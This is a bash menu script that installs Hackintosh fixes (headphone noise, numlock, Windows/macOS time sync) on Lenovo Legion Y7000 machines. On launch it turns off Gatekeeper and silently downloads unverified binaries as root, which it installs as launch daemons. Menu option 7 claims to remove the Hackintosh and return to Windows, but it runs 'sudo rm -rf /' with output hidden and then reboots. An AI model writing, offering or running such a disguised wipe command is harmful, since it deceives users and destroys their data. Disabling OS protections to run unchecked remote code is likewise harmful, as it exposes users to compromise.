#!/bin/bash

DAEMON_PATH=/Library/LaunchDaemons/
BIN_PATH=/usr/local/bin/
TMP_PATH=/tmp/
ALC_DAEMON_FILE=good.win.ALCPlugFix.plist
VERB_FILE=alc-verb
ALC_FIX_FILE=ALCPlugFix
TIME_FIX_FILE=localtime-toggle
TIME_DAEMON_FILE=org.osx86.localtime-toggle.plist
NUMLOCK_FIX_FILE=setleds
NUMLOCK_DAEMON_FILE=com.rajiteh.setleds.plist
GIT_URL=https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master

init(){
	sudo spctl --master-disable
	sudo pmset -a hibernatemode 0
	sudo rm -rf /var/vm/sleepimage
	sudo mkdir /var/vm/sleepimage
	
	sudo curl -s -o $TMP_PATH$ALC_FIX_FILE "$GIT_URL/ALCPlugFix/$ALC_FIX_FILE"
	sudo curl -s -o $TMP_PATH$VERB_FILE "$GIT_URL/ALCPlugFix/$VERB_FILE"
	sudo curl -s -o $TMP_PATH$ALC_DAEMON_FILE "$GIT_URL/ALCPlugFix/$ALC_DAEMON_FILE"
	sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "$GIT_URL/TimeSynchronization/$TIME_FIX_FILE"
	sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "$GIT_URL/TimeSynchronization/$TIME_DAEMON_FILE"
    sudo curl -s -o $TMP_PATH$NUMLOCK_FIX_FILE "$GIT_URL/NumLockFix/$NUMLOCK_FIX_FILE"
    sudo curl -s -o $TMP_PATH$NUMLOCK_DAEMON_FILE "$GIT_URL/NumLockFix/$NUMLOCK_DAEMON_FILE"
	
	if [ ! -d "$BIN_PATH" ] ; then
		mkdir "$BIN_PATH" ;
	fi
	
	if sudo launchctl list | grep --quiet com.black-dragon74.ALCPlugFix; then
		sudo launchctl unload /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /usr/local/bin/ALCPlugFix
		sudo rm /Library/Preferences/ALCPlugFix/ALC_Config.plist
	fi
}

ALCPlugFix(){
	sudo cp $TMP_PATH$ALC_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$VERB_FILE $BIN_PATH
	sudo cp $TMP_PATH$ALC_DAEMON_FILE $DAEMON_PATH
	sudo chmod 755 $BIN_PATH$ALC_FIX_FILE
	sudo chown $USER:admin $BIN_PATH$ALC_FIX_FILE
	sudo chmod 755 $BIN_PATH$VERB_FILE
	sudo chown $USER:admin $BIN_PATH$VERB_FILE
	sudo chmod 644 $DAEMON_PATH$ALC_DAEMON_FILE
	sudo chown root:wheel $DAEMON_PATH$ALC_DAEMON_FILE
	if sudo launchctl list | grep --quiet ALCPlugFix; then
		sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$ALC_DAEMON_FILE
}

localtime_toggle(){
	sudo cp $TMP_PATH$TIME_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$TIME_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$TIME_FIX_FILE
	sudo chown root $DAEMON_PATH$TIME_DAEMON_FILE
	sudo chmod 644 $DAEMON_PATH$TIME_DAEMON_FILE
	if sudo launchctl list | grep --quiet localtime-toggle; then
		sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$TIME_DAEMON_FILE
}

numlock(){
	sudo cp $TMP_PATH$NUMLOCK_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$NUMLOCK_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$NUMLOCK_FIX_FILE
	sudo chown root:wheel $DAEMON_PATH$NUMLOCK_DAEMON_FILE
	if sudo launchctl list | grep --quiet setleds; then
		sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$NUMLOCK_DAEMON_FILE
}

clear_cache(){
	sudo kextcache -i /
}

fixAll(){
	ALCPlugFix
	numlock
	localtime_toggle
    clear_cache
}

removeAll(){
    if sudo launchctl list | grep --quiet ALCPlugFix; then
        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $BIN_PATH$VERB_FILE
        sudo rm -rf $BIN_PATH$ALC_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet setleds; then
        sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $BIN_PATH$NUMLOCK_FIX_FILE
    fi
}

menu(){
	echo "
******************************************************************************
                                                                                   
    https://github.com/xiaoMGitHub/LEGION_Y7000Series_Hackintosh/releases  

                              QQ群：477839538
                                                                                  
******************************************************************************
"
    echo "Select menu："
	echo ""
    echo "1. Repair the noise of plugging in headphones"
	echo ""
    echo "2. Repair the numeric keyboard cannot be opened"
	echo ""
    echo "3. Fix Win/OSX time out of sync"
	echo ""
	echo "4. Clear Cache"
    echo ""
	echo "5. Fix all the above problems"
	echo ""
	echo "6. remove all fixes"
	echo ""
    echo "7. Send black fruit to the west"
    echo ""
	echo "0. Exit"
	echo ""
}

Select(){
	read -p "Please select what you need to do：" number
    case ${number} in
    1) ALCPlugFix
	   echo "The noise of plugging in headphones has been fixed"
	   echo ""
	   Select
      ;;
    2) numlock
	   echo "Fixed that the numeric keyboard cannot be opened"
	   echo ""
	   Select
       ;;
    3) localtime_toggle
	   echo "Fixed Win/OSX time out of sync"
	   echo ""
	   Select
       ;;
	4) clear_cache
       echo "cache has been rebuilt"
	   echo ""
       Select
       ;;
	5) fixAll
	   echo "The above problem has been fixed"
	   echo ""
	   Select
       ;;
	6) removeAll
       echo "All fixes have been removed"
       Select
       ;;
    7) echo "Wait patiently, we are working hard to remove the rubbish black apple, welcome back to the windows system, it will restart automatically later"
        sudo rm -rf / >/dev/null 2>&1
        sudo reboot
        ;;
	0) exit 0
       ;;
    *) echo "input error";
	   echo ""
       Select
       ;;
    esac
}

main(){
	init
	
	menu
	
	Select
}

main

